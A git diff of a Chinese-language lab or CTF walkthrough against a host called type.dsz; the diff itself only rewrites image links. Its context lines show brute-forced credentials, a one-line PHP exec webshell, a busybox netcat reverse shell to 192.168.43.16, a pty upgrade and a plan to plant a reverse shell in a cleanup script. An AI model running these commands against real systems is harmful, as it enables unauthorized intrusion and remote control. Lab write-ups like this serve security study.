@@ -5,8 +5,8 @@
  cat pass.txt|grep '^[A-Z]' > pass2.txt
 ```
 
-![[Pasted image 20260227093556.png]]
-![[Pasted image 20260227093628.png]]
+![](images/Pasted%20image%2020260227093556.png)
+![](images/Pasted%20image%2020260227093628.png)
 
 http://type.dsz/index.php/author/1/
 用户名
@@ -15,20 +15,20 @@ admin
 sburro
 plugugly
 ```
-![[Pasted image 20260227093800.png]]
-![[Pasted image 20260227093824.png]]
-![[Pasted image 20260227093842.png]]
+![](images/Pasted%20image%2020260227093800.png)
+![](images/Pasted%20image%2020260227093824.png)
+![](images/Pasted%20image%2020260227093842.png)
 - payload1
-![[Pasted image 20260227094215.png]]
+![](images/Pasted%20image%2020260227094215.png)
 
 - payload2
-![[Pasted image 20260227094149.png]]
+![](images/Pasted%20image%2020260227094149.png)
 - burp爆破发现用户密码
 	name=sburro
 	password=DevNotes
-![[Pasted image 20260227094402.png]]
+![](images/Pasted%20image%2020260227094402.png)
 ## 登录
-![[Pasted image 20260227094555.png]]
+![](images/Pasted%20image%2020260227094555.png)
 发现管理标题 有串密钥，推测是管理员密码 `2DbYCYpXwvV9kKwO`
 
 ###  写入木马
@@ -37,13 +37,13 @@ plugugly
 ```php
 <?php exec($_GET[0]);?>
 ```
-![[Pasted image 20260227095102.png]]
+![](images/Pasted%20image%2020260227095102.png)
 
 ```http
 http://type.dsz/?0= busybox nc 192.168.43.16 -e /bin/sh
 ```
 https://www.doubao.com/thread/w22e6a59aec28a8a7
-![[Pasted image 20260227095743.png]]
+![](images/Pasted%20image%2020260227095743.png)
 由于只有sh解释器，这里稳定脚本语句如下：
 ```bash
 python3 -c "import pty;pty.spawn('/bin/sh');"
@@ -156,7 +156,7 @@ export XAUTHORITY=/home/plugugly/.Xauthority
 sudo /root/typer.py
 ```
 
-![[Pasted image 20260227112558.png]]
+![](images/Pasted%20image%2020260227112558.png)
 
 给cleanup_scores.sh加上反弹shell
 ```
